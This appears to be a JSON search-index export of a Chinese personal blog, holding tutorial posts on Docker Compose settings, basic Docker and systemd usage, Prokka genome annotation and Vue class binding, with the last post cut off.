SHOW: &#x27;true&#x27; expose暴露端口，但不映射到宿主机，只被连接的服务访问。 仅可以指定内部端口为参数： 123expose: - &quot;3000&quot; - &quot;8000&quot; extra_hosts添加主机名映射。类似 docker client –add-host。 123extra_hosts: - &quot;somehost:162.242.195.82&quot; - &quot;otherhost:50.31.209.229&quot; 以上会在此服务的内部容器中 &#x2F;etc&#x2F;hosts 创建一个具有 ip 地址和主机名的映射关系： 12162.242.195.82 somehost50.31.209.229 otherhost healthcheck用于检测 docker 服务是否健康运行。 123456healthcheck: test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;] # 设置检测程序 interval: 1m30s # 设置检测间隔 timeout: 10s # 设置检测超时时间 retries: 3 # 设置重试次数 start_period: 40s # 启动后，多少秒开始启动检测程序 image指定容器运行的镜像。以下格式都可以： 12345image: redisimage: ubuntu:14.04image: tutum/influxdbimage: example-registry.com:4000/postgresqlimage: a4bc65fd # 镜像id logging服务的日志记录配置。 driver：指定服务容器的日志记录驱动程序，默认值为json-file。有以下三个选项 123driver: &quot;json-file&quot;driver: &quot;syslog&quot;driver: &quot;none&quot; 仅在 json-file 驱动程序下，可以使用以下参数，限制日志得数量和大小。 12345logging: driver: json-file options: max-size: &quot;200k&quot; # 单个文件大小为200k max-file: &quot;10&quot; # 最多10个文件 当达到文件限制上限，会自动删除旧得文件。 syslog 驱动程序下，可以使用 syslog-address 指定日志接收地址。 1234logging: driver: syslog options: syslog-address: &quot;tcp://192.168.0.42:123&quot; network_mode设置网络模式。 12345network_mode: &quot;bridge&quot;network_mode: &quot;host&quot;network_mode: &quot;none&quot;network_mode: &quot;service:[service name]&quot;network_mode: &quot;container:[container name/id]&quot; networks 配置容器连接的网络，引用顶级 networks 下的条目 。 12345678910111213141516services: some-service: networks: some-network: aliases: - alias1 other-network: aliases: - alias2networks: some-network: # Use a custom driver driver: custom-driver-1 other-network: # Use a custom driver which takes special options driver: custom-driver-2 aliases ：同一网络上的其他容器可以使用服务名称或此别名来连接到对应容器的服务。 restart no：是默认的重启策略，在任何情况下都不会重启容器。 always：容器总是重新启动。 on-failure：在容器非正常退出时（退出状态非0），才会重启容器。 unless-stopped：在容器退出时总是重启容器，但是不考虑在Docker守护进程启动时就已经停止了的容器 1234restart: &quot;no&quot;restart: alwaysrestart: on-failurerestart: unless-stopped 注：swarm 集群模式，请改用 restart_policy。 secrets存储敏感数据，例如密码： 12345678910111213version: &quot;3.1&quot;services:mysql: image: mysql environment: MYSQL_ROOT_PASSWORD_FILE: /run/secrets/my_secret secrets: - my_secretsecrets: my_secret: file: ./my_secret.txt security_opt修改容器默认的 schema 标签。 12345security-opt： - label:user:USER # 设置容器的用户标签 - label:role:ROLE # 设置容器的角色标签 - label:type:TYPE # 设置容器的安全策略标签 - label:level:LEVEL # 设置容器的安全等级标签 stop_grace_period指定在容器无法处理 SIGTERM (或者任何 stop_signal 的信号)，等待多久后发送 SIGKILL 信号关闭容器。 12stop_grace_period: 1s # 等待 1 秒stop_grace_period: 1m30s # 等待 1 分 30 秒 默认的等待时间是 10 秒。 stop_signal设置停止容器的替代信号。默认情况下使用 SIGTERM 。 以下示例，使用 SIGUSR1 替代信号 SIGTERM 来停止容器。 1stop_signal: SIGUSR1 sysctls设置容器中的内核参数，可以使用数组或字典格式。 1234567sysctls: net.core.somaxconn: 1024 net.ipv4.tcp_syncookies: 0sysctls: - net.core.somaxconn=1024 - net.ipv4.tcp_syncookies=0 tmpfs在容器内安装一个临时文件系统。可以是单个值或列表的多个值。 12345tmpfs: /runtmpfs: - /run - /tmp ulimits覆盖容器默认的 ulimit。 12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes将主机的数据卷或着文件挂载到容器里。 1234567version: &quot;3.7&quot;services: db: image: postgres:latest volumes: - &quot;/localhost/postgres.sock:/var/run/postgres/postgres.sock&quot; - &quot;/localhost/data:/var/lib/postgresql/data&quot;","categories":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/tags/Docker/"}],"author":"Sn0wma1n"},{"title":"Docker学习(四):文件传输与服务搭建","slug":"Docker学习-四-文件传输与服务搭建-9eb8186804694de18718aa6fd4ae82a4","date":"2024-03-01T16:00:00.000Z","updated":"2024-03-02T14:19:25.710Z","comments":true,"path":"2024/03/02/Docker学习-四-文件传输与服务搭建-9eb8186804694de18718aa6fd4ae82a4/","link":"","permalink":"https://snowman12137.github.io/2024/03/02/Docker%E5%AD%A6%E4%B9%A0-%E5%9B%9B-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%B8%8E%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA-9eb8186804694de18718aa6fd4ae82a4/","excerpt":"","text":"Docker学习(四):文件传输与服务搭建一、文件传输1.先拿到容器ID全称拿到短ID 1docker inspect -f &#x27;&#123;&#123;.Id&#125;&#125;&#x27; d162c8a4d084 2.传输文件1docker cp 本地文件路径 ID全称:容器路径 1docker cp .\\Desktop\\HelloWorld.txt d162c8a4d08424c31fff1ca59462b9e29417341b032010fdfd3c97c9208bcdc2:/root/HelloWorld.txt 进入到容器中可以看到我们的文件被传输到里面去了 如果是容器传输文件到本地的话，反过来就好了： 1docker cp ID全称:容器文件路径 本地路径 二、服务搭建编写Systemd Service开启服务 教程来自：https://segmentfault.com/a/1190000014740871 1. 什么是Systemd Service Systemd 服务是一种以 .service 结尾的单元（unit）配置文件，用于控制由Systemd 控制或监视的进程。简单说，用于后台以守护精灵（daemon）的形式运行程序。 Systemd 广泛应用于新版本的RHEL、SUSE Linux Enterprise、CentOS、Fedora和openSUSE中，用于替代旧有的服务管理器service。 基本命令： 123456systemctl command xxx.service# 其中command可以是start、stop、restart、enable等，比如：systemctl start httpd.service #启动Apache服务systemctl stop httpd.service #停止Apache服务systemctl restart httpd.service #停止Apache服务systemctl enable mariadb.service #将MariaDB服务设为开机启动 • Systemd Service 位于 /etc/systemd/system（供系统管理员和用户使用），/usr/lib/systemd/system（供发行版打包者使用），我们一般使用前者即可。 2.编写Systemd Service• Systemd 服务的内容主要分为三个部分，控制单元（unit）的定义、服务（service）的定义、以及安装部分。 a 定义控制单元 [Unit] 在 Systemd 中，所有引导过程中 Systemd 要控制的东西都是一个单元。基本的用法如下： Description：代表整个单元的描述，可根据需要任意填写。 Wants：本单元启动了，它“想要”的单元也会被启动。但是这个单元若启动不成功，对本单元没有影响。 Requires: 这个单元启动了，那么它“需要”的单元也会被启动; 它“需要”的单元被停止了，它自己也活不了。但是请注意，这个设定并不能控制启动顺序，因为它“需要”的单元启动也需要时间，若它“需要”的单元启动还未完成，就开始启动本单元，则本单元也无法启动，所以不建议使用这个字段。 OnFailure：若本单元启动失败了，那么启动这个单元作为折衷。 Before&#x2F;After：指定启动顺序。 看一个实际的例子： 1234[Unit]Description=Protect ARP listWants=network-online.targetAfter=network.target • 其中network.target代表有网路，network-online.target代表一个连通着的网络。 b 定义服务本体 [service] 在定义完了 Systemd 用来识别服务的单元后，我们来定义服务本体。基本的用法如下： Type：服务的类型，各种类型的区别如下所示 simple：默认，这是最简单的服务类型。意思就是说启动的程序就是主体程序，这个程序要是退出那么一切皆休。 forking：标准 Unix Daemon 使用的启动方式。启动程序后会调用 fork() 函数，把必要的通信频道都设置好之后父进程退出，留下守护精灵的子进程。 oneshot：适用于那些被一次性执行的任务或者命令，它运行完成后便了无痕迹。因为这类服务运行完就没有任何痕迹，我们经常会需要使用 RemainAfterExit&#x3D;yes。意思是说，即使没有进程存在，Systemd 也认为该服务启动成功了。同时只有这种类型支持多条命令，命令之间用;分割，如需换行可以用\\。 dbus：这个程序启动时需要获取一块 DBus 空间，所以需要和 BusName&#x3D; 一起用。只有它成功获得了 DBus 空间，依赖它的程序才会被启动。 ExecStart：在输入的命令是start时候执行的命令，这里的命令启动的程序必须使用绝对路径，比如你必须用/sbin/arp而不能简单的以环境变量直接使用arp。 ExecStop：在输入的命令是stop时候执行的命令，要求同上。 ExecReload：这个不是必需，如果不写则你的service就不支持restart命令。ExecStart和ExecStop是必须要有的。 看一个实际的例子： 123456[Service]Type=oneshotRemainAfterExit=yesExecStart=/sbin/arp -f /etc/ip-macExecReload=/sbin/arp -f /etc/ip-macExecStop=/sbin/arp -d -a • 这里在start和restart的时候会读取并添加/etc/ip-mac文件中的ARP条目到ARP表中，而stop时清空ARP表。 c. 安装服务 [install] 服务编写完之后还需要被systemd装载，定义安装单元各个字段如下： WantedBy：设置服务被谁装载，一般设置为multi-user.target Alias：为service设置一个别名，可以使用多个名字来操作服务。 Also：在安装这个服务时候还需要的其他服务 d.完整的 Systemd Service 配置实例• 组合上面的三个模块，我们可以得到一个完整的 Systemd Service 配置实例： 123456789101112[Unit]Description=Protect ARP listWants=network-online.targetAfter=network.target[Service]Type=oneshotRemainAfterExit=yesExecStart=/sbin/arp -f /etc/ip-macExecReload=/sbin/arp -f /etc/ip-macExecStop=/sbin/arp -d -a[Install]WantedBy=multi-user.target","categories":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/tags/Docker/"}],"author":"Sn0wma1n"},{"title":"Docker学习(一):安装docker（win）","slug":"Docker学习-一-安装docker（win）-842d24f88e8940f28160a957ffea2fc8","date":"2024-02-29T16:00:00.000Z","updated":"2024-03-02T14:19:02.635Z","comments":true,"path":"2024/03/01/Docker学习-一-安装docker（win）-842d24f88e8940f28160a957ffea2fc8/","link":"","permalink":"https://snowman12137.github.io/2024/03/01/Docker%E5%AD%A6%E4%B9%A0-%E4%B8%80-%E5%AE%89%E8%A3%85docker%EF%BC%88win%EF%BC%89-842d24f88e8940f28160a957ffea2fc8/","excerpt":"","text":"Docker学习(一):安装docker（win）教程来自菜鸟 一、前言因为项目的代码必须要在Linux才能运行，为了跨平台的性能考虑，因此我打算使用win+docker的形式来运行后端，开始学习。 二、Windows Docker 安装Docker 并非是一个通用的容器工具，它依赖于已存在并运行的 Linux 内核环境。 Docker 实质上是在已经运行的 Linux 下制造了一个隔离的文件环境，因此它执行的效率几乎等同于所部署的 Linux 主机。 因此，Docker 必须部署在 Linux 内核的系统上。如果其他系统想部署 Docker 就必须安装一个虚拟 Linux 环境。 在 Windows 上部署 Docker 的方法都是先安装一个虚拟机，并在安装 Linux 系统的的虚拟机中运行 Docker。 Win10 系统 Docker Desktop 是 Docker 在 Windows 10 和 macOS 操作系统上的官方安装方式，这个方法依然属于先在虚拟机中安装 Linux 然后再安装 Docker 的方法。 Docker Desktop 官方下载地址 安装 Hyper-VHyper-V 是微软开发的虚拟机，类似于 VMWare 或 VirtualBox，仅适用于 Windows 10。这是 Docker Desktop for Windows 所使用的虚拟机。 但是，这个虚拟机一旦启用，QEMU、VirtualBox 或 VMWare Workstation 15 及以下版本将无法使用！如果你必须在电脑上使用其他虚拟机（例如开发 Android 应用必须使用的模拟器），请不要使用 Hyper-V！ 开启 Hyper-V 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All 安装 Docker Desktop for Windows点击 Get started with Docker Desktop，并下载 Windows 的版本，如果你还没有登录，会要求注册登录： 运行安装文件双击下载的 Docker for Windows Installer 安装文件，一路 Next，点击 Finish 完成安装。 安装完成后，Docker 会自动启动。通知栏上会出现个小鲸鱼的图标，这表示 Docker 正在运行。 安装之后，可以打开 PowerShell 并运行以下命令检测是否运行成功： 1docker run hello-world 二、镜像加速&#x2F;更改下载文件位置点击设置 镜像加速点击Docker Engine然后加入 123456&quot;registry-mirrors&quot;: [ &quot;https://docker.mirrors.ustc.edu.cn&quot;, &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://mirror.ccs.tencentyun.com&quot;] 再点击Apply即可 更改下载文件位置","categories":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/tags/Docker/"}],"author":"Sn0wma1n"},{"title":"Docker学习(二):docker基本操作","slug":"Docker学习-二-docker基本操作-29260b33a8e64d8a97d968c0e6f26703","date":"2024-02-29T16:00:00.000Z","updated":"2024-03-02T14:20:11.032Z","comments":true,"path":"2024/03/01/Docker学习-二-docker基本操作-29260b33a8e64d8a97d968c0e6f26703/","link":"","permalink":"https://snowman12137.github.io/2024/03/01/Docker%E5%AD%A6%E4%B9%A0-%E4%BA%8C-docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-29260b33a8e64d8a97d968c0e6f26703/","excerpt":"","text":"Docker学习(二):docker基本操作一、容器使用1.获取镜像如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像： 1docker pull ubuntu 2.启动容器以下命令使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器： 1docker run -it ubuntu /bin/bash 参数说明： i: 交互式操作。 t: 终端。 ubuntu: ubuntu 镜像。 &#x2F;bin&#x2F;bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。 要退出终端，直接输入 exit: 1root@a66766153195:/# exit 3启动已停止运行的容器查看所有的容器命令如下： 1docker ps -a 使用 docker start 启动一个已停止的容器： 1docker start 59d7601fde38 4后台运行在大部分的场景下，我们希望 docker 的服务是在后台运行的，我们可以过 -d 指定容器的运行模式。 1docker run -itd --name ubuntu-test ubuntu /bin/bas 注：加了 -d 参数默认不会进入容器，想要进入容器需要使用指令 docker exec（下面会介绍到）。 5停止一个容器1docker stop &lt;容器 ID&gt; 停止的容器可以通过 docker restart 重启： 1docker restart &lt;容器 ID&gt; 6进入容器在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入： docker attach docker exec：推荐大家使用 docker exec 命令，因为此命令会退出容器终端，但不会导致容器的停止。 12docker exec -it d162c8a4d084 /bin/bashdocker attach ****-it d162c8a4d084 /bin/bash 7导出和导入容器a导出容器如果要导出本地某个容器，可以使用 docker export 命令。 1docker export 1e560fca3906 &gt; ubuntu.tar 这样将导出容器快照到本地文件。 b导入容器快照可以使用 docker import 从容器快照文件中再导入为镜像，以下实例将快照文件 ubuntu.tar 导入到镜像 test&#x2F;ubuntu:v1: 1cat docker/ubuntu.tar | docker import - test/ubuntu:v1 此外，也可以通过指定 URL 或者某个目录来导入，例如： 1docker import http://example.com/exampleimage.tgz example/imagerepo 8删除容器删除容器使用 docker rm 命令： 1docker rm -f 1e560fca3906 总结镜像，容器命令关系图如下图所示 二、运行一个web应用前面我们运行的容器并没有一些什么特别的用处。 接下来让我们尝试使用 docker 构建一个 web 应用程序。 我们将在docker容器中运行一个 Python Flask 应用来运行一个web应用。 12docker pull training/webappC:\\Users\\xiaow&gt;docker run -d -P training/webapp python app.py 这里多了端口信息。 10.0.0.0:32768-&gt;5000/tcp adoring_hopper Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上。 这时我们可以通过浏览器访问WEB应用 1 查看 WEB 应用程序日志查看 WEB 应用程序日志docker logs [ID或者名字] 可以查看容器内部的标准输出。 f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。 从上面，我们可以看到应用程序使用的是 5000 端口并且能够查看到应用程序的访问日志。 2 查看WEB应用程序容器的进程我们还可以使用 docker top 来查看容器内部运行的进程 3.检查 WEB 应用程序使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。 三、Docker镜像使用1.列出镜像列表1docker images 各个选项说明: REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。 所以，我们如果要使用版本为15.10的ubuntu系统镜像来运行容器时，命令如下： 12C:\\Users\\xiaow&gt;docker run -it ubuntu:15.10 /bin/bashroot@d162c8a4d084:/# 参数说明： i: 交互式操作。 t: 终端。 ubuntu:15.10: 这是指用 ubuntu 15.10 版本镜像为基础来启动容器。 &#x2F;bin&#x2F;bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。 2.获取一个新的镜像当我们在本地主机上使用一个不存在的镜像时 Docker 就会自动下载这个镜像。如果我们想预先下载这个镜像，我们可以使用 docker pull 命令来下载它。 12345678docker pull ubuntu:15.1015.10: Pulling from library/ubuntu7dcf5a444392: Pull complete759aa75f3cee: Pull complete3fa871dc8a2b: Pull complete224c42ae46e7: Pull completeDigest: sha256:02521a2d079595241c6793b2044f02eecf294034f31d6e235ac4b2b54ffc41f3Status: Downloaded newer image for ubuntu:15.10 下载完成后，我们可以直接使用这个镜像来运行容器。 3查找镜像我们可以从 Docker Hub 网站来搜索镜像，Docker Hub 网址为： https://hub.docker.com/ 我们也可以使用 docker search 命令来搜索镜像。比如我们需要一个 httpd 的镜像来作为我们的 web 服务。我们可以通过 docker search 命令搜索 httpd 来寻找适合我们的镜像。 4 拖取镜像我们决定使用上图中的 httpd 官方版本的镜像，使用命令 docker pull 来下载镜像。 123456789101112C:\\Users\\xiaow&gt;docker pull httpdUsing default tag: latestlatest: Pulling from library/httpde1caac4eb9d2: Pull complete87b0fe460fd9: Pull complete4f4fb700ef54: Pull complete9cebd3e3b523: Pull completee9304da947c5: Pull completeb60d4b66b268: Pull completeDigest: sha256:104f07de17ee186c8f37b9f561e04fbfe4cf080d78c6e5f3802fd08fd118c3daStatus: Downloaded newer image for httpd:latestdocker.io/library/httpd:latest 下载完成后，我们就可以使用这个镜像了。 1docker run httpd 5 删除镜像镜像删除使用 docker rmi 命令，比如我们删除 hello-world 镜像： 1docker rmi hello-world 6 创建镜像当我们从 docker 镜像仓库中下载的镜像不能满足我们的需求时，我们可以通过以下两种方式对镜像进行更改。 1、从已经创建的容器中更新镜像，并且提交这个镜像 2、使用 Dockerfile 指令来创建一个新的镜像 a 更新镜像更新镜像之前，我们需要使用镜像来创建一个容器。 12C:\\Users\\xiaow&gt;docker run -it ubuntu:15.10 /bin/bashroot@ff61c4fac64f:/# apt -get update 在运行的容器内使用 apt-get update 命令进行更新。 在完成操作之后，输入 exit 命令来退出这个容器。 此时 ID 为 ff61c4fac64f的容器，是按我们的需求更改的容器。我们可以通过命令 docker commit 来提交容器副本。 12C:\\Users\\xiaow&gt;docker commit -m=&quot;has update&quot; -a=&quot;Sn0wm1an&quot; ff61c4fac64f Sn0wm1an/ubuntu:v2 sha256:ae1d6cfe0a7c2fde9d8a490435ebc947821288c877faade9a5e7d403d08bd352 各个参数说明： m: 提交的描述信息 a: 指定镜像作者 e218edb10161：容器 ID runoob&#x2F;ubuntu:v2: 指定要创建的目标镜像名 我们可以使用 docker images 命令来查看我们的新镜像 Sn0wm1an**&#x2F;ubuntu:v2**： 使用我们的新镜像 Sn0wm1an**&#x2F;ubuntu** 来启动一个容器 四、进阶使用方法1.Docker 容器连接前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。 容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 -P 或 -p 参数来指定端口映射。 下面我们来实现通过端口连接到一个 docker 容器。 a.端口映射我们创建了一个 python 应用的容器。 1docker run -d -P training/webapp python app.py 另外，我们可以指定容器绑定的网络地址，比如绑定 127.0.0.1。 我们使用 -P 绑定端口号，使用 docker ps 可以看到容器端口 5000 绑定主机端口 32768。 我们也可以使用 -p 标识来指定容器端口绑定到主机端口。 两种方式的区别是: P :是容器内部端口随机映射到主机的端口。 p : 是容器内部端口绑定到指定的主机端口。 1docker run -d -p 5000:5000 training/webapp python app.py bDocker 容器互联端口映射并不是唯一把 docker 连接到另一个容器的方法。 docker 有一个连接系统允许将多个容器连接在一起，共享连接信息。 docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息。 容器命名 当我们创建一个容器的时候，docker 会自动对它进行命名。另外，我们也可以使用 –name 标识来命名容器，例如： 1docker run -d -P --name Sn0wm1an training/webapp python app.py 新建网络 下面先创建一个新的 Docker 网络。 1docker network create -d bridge test-net 参数说明： d：参数指定 Docker 网络类型，有 bridge、overlay。 其中 overlay 网络类型用于 Swarm mode，在本小节中你可以忽略它。 连接容器 运行一个容器并连接到新建的 test-net 网络: 1docker run -itd --name test1 --network test-net ubuntu /bin/bash 打开新的终端，再运行一个容器并加入到 test-net 网络: 1$ docker run -itd --name test2 --network test-net ubuntu /bin/bash c 配置 DNS我们可以在宿主机的 &#x2F;etc&#x2F;docker&#x2F;daemon.json 文件中增加以下内容来设置全部容器的 DNS： 123456&#123; &quot;dns&quot; : [ &quot;114.114.114.114&quot;, &quot;8.8.8.8&quot; ]&#125; 设置后，启动容器的 DNS 会自动配置为 114.114.114.114 和 8.8.8.8。 配置完，需要重启 docker 才能生效。 查看容器的 DNS 是否生效可以使用以下命令，它会输出容器的 DNS 信息：","categories":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://snowman12137.github.io/tags/Docker/"}],"author":"Sn0wma1n"},{"title":"宏基因组实战:基因注释Prokka","slug":"宏基因组实战-基因注释Prokka","date":"2024-02-19T16:00:00.000Z","updated":"2024-03-02T14:14:45.461Z","comments":true,"path":"2024/02/20/宏基因组实战-基因注释Prokka/","link":"","permalink":"https://snowman12137.github.io/2024/02/20/%E5%AE%8F%E5%9F%BA%E5%9B%A0%E7%BB%84%E5%AE%9E%E6%88%98-%E5%9F%BA%E5%9B%A0%E6%B3%A8%E9%87%8AProkka/","excerpt":"","text":"宏基因组实战:基因注释Prokka1.Prokka简介细菌基因组、宏基因组的基因注释一直是一个非常复杂的问题，Prokka的出现改变了这一切。 Prokka: rapid prokaryotic genome annotation，快速的原核基因组注释。就是上面的神兽，猜猜是什么动物，但真不是皮卡丘。 Prokka是一个命令行软件工具，可以在一台典型台式机上在约10分钟内充分注释一个细菌基因组草图。它产生标准兼容的输出文件以进行进一步分析或者在基因组浏览器中查看。Prokka是用Perl实现的，在遵循开源GPLv2许可证下可以从 http://www.vicbioinformatics.com/software.prokka.shtml 免费获得。 此软件2014年发表于Bioinformatics，截止2017年11月2日Google学术统计引用1265次，最新版本1.12于2017年3月14日更新，大小360MB。因为它是一个复杂的分析流程，依赖关系众多。 2.安装方案一：源码安装安装源码(下载时候会有一点慢) 123456789git clone https://github.com/tseemann/prokka.git# 安装依赖关系sudo apt-get -y install bioperl libdatetime-perl libxml-simple-perl libdigest-md5-perl# 安装perl包XMLsudo bashexport PERL_MM_USE_DEFAULT=1export PERL_EXTUTILS_AUTOINSTALL=&quot;--defaultdeps&quot;perl -MCPAN -e &#x27;install &quot;XML::Simple&quot;&#x27;exit 添加环境变量和设置数据库 123456# 添加环境变量export PATH=$PATH:`pwd`/prokka/bin# 自动搜索并添加数据库prokka --setupdb# 测序数据库prokka --listdb 方案二：conda安装12345678conda activate mambamamba create -y -c anaconda -c bioconda prokka pandas seaborn ipykernel perl-bioperl==1.7.2 -n prokkaconda activate /home/gc/metaGEM/workflow/envs/prokkaroary# 自动搜索并添加数据库prokka --setupdb# 测序数据库prokka --listdb 3.使用prokka12345# 建立工作目录mkdir annotation-prokkacd annotation-prokka# 一句命令10分钟搞定之前别人半年的工作prokka /home/gc/metaGEM/workflow/refined_bins/L1EFG190305--AM43/metawrap_50_10_bins/bin.1.fa --outdir prokka_annotation --prefix metagG --metagenome --kingdom Bacteria --centre new-test --compliant &#x2F;home&#x2F;gc&#x2F;metaGEM&#x2F;workflow&#x2F;refined_bins&#x2F;L1EFG190305–AM43&#x2F;metawrap_50_10_bins&#x2F;bin.1.fa 是你要注释文件的路径 –outdir prokka_annotation 输出文件的名称 输出文件如下 123PROKKA_02182024.err PROKKA_02182024.fna PROKKA_02182024.gff PROKKA_02182024.tblPROKKA_02182024.faa PROKKA_02182024.fsa PROKKA_02182024.log PROKKA_02182024.tsvPROKKA_02182024.ffn PROKKA_02182024.gbk PROKKA_02182024.sqn PROKKA_02182024.txt .gff | 基因注释文件，包括gff和序列，可用igv直接查看.gbk | Genebank格式，来自gff.fna | 输入contig核酸文件.faa | 翻译CDS的AA序列.ffn | 所有转录本核酸序列.sqn | 用于提交的序列.fsa | 输入序列，但有sqn的描述，用于tbl2asn生成sqn文件.tbl | 特征表，用于tbl2asn生成sqn文件.err | 错误报告.log | 日志.txt | 统计结果.tsv | 所有注释基因特征表格 观看结果 1234567891011121314# 进入结果目录cd prokka_annotation# 结果总结cat PROKKA_02182024.txt organism: Genus species strain contigs: 233bases: 5994082CDS: 5023gene: 5080rRNA: 3repeat_region: 1tRNA: 53tmRNA: 1 上面我们看到结果统计的叠连群(contigs)数量，预测基因(CDS)数量等基本信息。下面看一下预测的基因序列。 预测基因展示： 12345678910111213# 查看序列的基因序列less -S PROKKA_02182024.fsa&gt;gnl|new-test|BGAGNHGB_1 [gcode=11] [organism=Genus species] [strain=strain]CCCCCACCGGACGCGGCGCGGGCGAGCCCGCTTGCGGGCCCCCCGGGCCCGCGGCGCCGGGGGCGGCGGGCGGTGCGGCGGGGGGCGAAGGCTGCGGGGGCGCCGCGACCGCAGAACCGGCGACGCCGATTCTCCCGACCACCGTGCCCACTTCGACGGTGGTGCCGGGCTGGATCAGGATCTCGGTGAGGACGCCCGCGATCGGCGCCGGTATCTCGGCATCGACCTTGTCGGTGGAGATCTCGAAGAGCGGTTCATCCCGTTTGACGGTTTCACCGATCTTCTTGAGCCACTTGGTGACGGTGCCTTCCGCGATGGATTCGCCCATCTGCGGCATGATCACGTCGGTCATTGATACCTCACACGAAGGAGAAGGGTGGGTCCACGAAGGTCAAAGGGAAGCCCCGAACCGCCAGGCAGCCGAACGCGTAGTCTAGCGCGGCCGCTCGTTTGCCGCGCTTCATCAGTATTCAGCGAGCGCCCGGATGGCGTCCGCGATCTTCAGGGCGTTCGGGAGAAAGTACTCCTCGAGCGGGGGTGAGTAGGGCACCGGGGTGTCGGGCGGAGCCACCCGCACGATGGGGGCGTCGAGGTGCTCGA","categories":[{"name":"生物计算机科学","slug":"生物计算机科学","permalink":"https://snowman12137.github.io/categories/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[],"author":"Sn0wma1n"},{"title":"VUE学习(三)","slug":"VUE学习-三","date":"2024-02-05T16:00:00.000Z","updated":"2024-03-02T14:16:51.403Z","comments":true,"path":"2024/02/06/VUE学习-三/","link":"","permalink":"https://snowman12137.github.io/2024/02/06/VUE%E5%AD%A6%E4%B9%A0-%E4%B8%89/","excerpt":"","text":"VUE学习(三)1 Class 与 Style 绑定数据绑定的一个常见需求场景是操纵元素的 CSS class 列表和内联样式。因为 class 和 style 都是 attribute，我们可以和其他 attribute 一样使用 v-bind 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue 专门为 class 和 style 的 v-bind 用法提供了特殊的功能增强。除了字符串外，表达式的值也可以是对象或数组。 a.绑定 HTML class我们可以给 :class (v-bind:class 的缩写) 传递一个对象来动态切换 class： 1&lt;div :class=&quot;&#123; active: isActive &#125;&quot;&gt;&lt;/div&gt; 上面的语法表示 active 是否存在取决于数据属性 isActive 的真假值。 你可以在对象中写多个字段来操作多个 class。此外，:class 指令也可以和一般的 class attribute 共存。举例来说，下面这样的状态 12const isActive = ref(true)const hasError = ref(false) 配合以下模板： 1234&lt;div class=&quot;static&quot; :class=&quot;&#123; active: isActive, &#x27;text-danger&#x27;: hasError &#125;&quot;&gt;&lt;/div&gt; 渲染的结果会是： 1&lt;div class=&quot;static active&quot;&gt;&lt;/div&gt; 当 isActive 或者 hasError 改变时，class 列表会随之更新。举例来说，如果 hasError 变为 true，class 列表也会变成 &quot;static active text-danger&quot;。 绑定的对象并不一定需要写成内联字面量的形式，也可以直接绑定一个对象： 1234const classObject = reactive(&#123; active: true, &#x27;text-danger&#x27;: false&#125;) 1&lt;div :class=&quot;classObject&quot;&gt;&lt;/div&gt; 这将渲染： 1&lt;div class=&quot;active&quot;&gt;&lt;/div&gt; 我们也可以绑定一个返回对象的计算属性。这是一个常见且很有用的技巧： 1234567const isActive = ref(true)const error = ref(null)const classObject = computed(() =&gt; (&#123; active: isActive.value &amp;&amp; !error.value, &#x27;text-danger&#x27;: error.value &amp;&amp; error.value.type === &#x27;fatal&#x27;&#125;)) 1&lt;div :class=&quot;classObject&quot;&gt;&lt;/div&gt; b.绑定数组我们可以给 :class 绑定一个数组来渲染多个 CSS class： 12const activeClass = ref(&#x27;active&#x27;)const errorClass = ref(&#x27;text-danger&#x27;) 1&lt;div :class=&quot;[activeClass, errorClass]&quot;&gt;&lt;/div&gt; 渲染的结果是： 1&lt;div class=&quot;active text-danger&quot;&gt;&lt;/div&gt; 如果你也想在数组中有条件地渲染某个 class，你可以使用三元表达式： 1&lt;div :class=&quot;[isActive ? activeClass : &#x27;&#x27;, errorClass]&quot;&gt;&lt;/div&gt; errorClass 会一直存在，但 activeClass 只会在 isActive 为真时才存在。 然而，这可能在有多个依赖条件的 class 时会有些冗长。因此也可以在数组中嵌套对象： 1&lt;div :class=&quot;[&#123; active: isActive &#125;, errorClass]&quot;&gt;&lt;/div&gt; c.在组件上使用对于只有一个根元素的组件，当你使用了 class attribute 时，这些 class 会被添加到根元素上并与该元素上已有的 class 合并。 举例来说，如果你声明了一个组件名叫 MyComponent，模板如下： 12&lt;!-- 子组件模板 --&gt;&lt;p class=&quot;foo 